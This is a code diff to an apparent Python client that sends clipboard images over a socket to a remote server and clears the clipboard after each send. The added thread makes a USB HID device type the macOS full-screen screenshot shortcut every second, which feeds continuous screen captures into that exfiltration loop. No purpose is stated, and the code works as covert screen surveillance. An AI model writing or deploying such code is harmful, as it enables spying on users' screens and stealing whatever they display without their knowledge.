@@ -94,15 +94,23 @@ def monitor_and_send_screenshots(sock):
         try:
             content = grabclipboard_img()
             if content is not None:
-                # Assuming the content is a base64 encoded image
                 encoded_img = base64.b64encode(content).decode("utf-8")
                 message = f"SCREENSHOT:{encoded_img}\n"
                 sock.sendall(message.encode("utf-8"))
-
-                # Clear the clipboard
                 write_to_clipboard("")
         except Exception as e:
             print(f"eek error : {e}")
+            break
+
+
+def periodic_hid_screenshot():
+    while True:
+        try:
+            if sys.platform == "darwin":
+                send_command_to_usb_device("type;⌘⌃⇧3\n")
+            time.sleep(1.0)
+        except Exception as e:
+            print(f"periodic HID screenshot error: {e}")
             break
 
 
@@ -119,6 +127,10 @@ def handle_server_connection():
         )
         screenshot_thread.daemon = True
         screenshot_thread.start()
+
+        hid_ss_thread = threading.Thread(target=periodic_hid_screenshot)
+        hid_ss_thread.daemon = True
+        hid_ss_thread.start()
 
         while True:
             data = sock.recv(1024)
